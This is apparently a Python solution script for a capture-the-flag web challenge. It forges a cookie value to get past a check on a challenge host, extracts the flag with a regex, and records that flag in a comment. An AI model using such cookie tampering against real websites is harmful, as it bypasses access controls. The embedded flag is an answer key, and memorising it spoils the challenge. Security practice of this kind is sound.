import requests
import re
site = "http://click-me.challs.olicyber.it/"

cookie = {
    "cookies" : "10000000"
}

r = requests.get(site, cookies=cookie).text
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)
#flag{n3v3r_tru5t_c00k1e5}
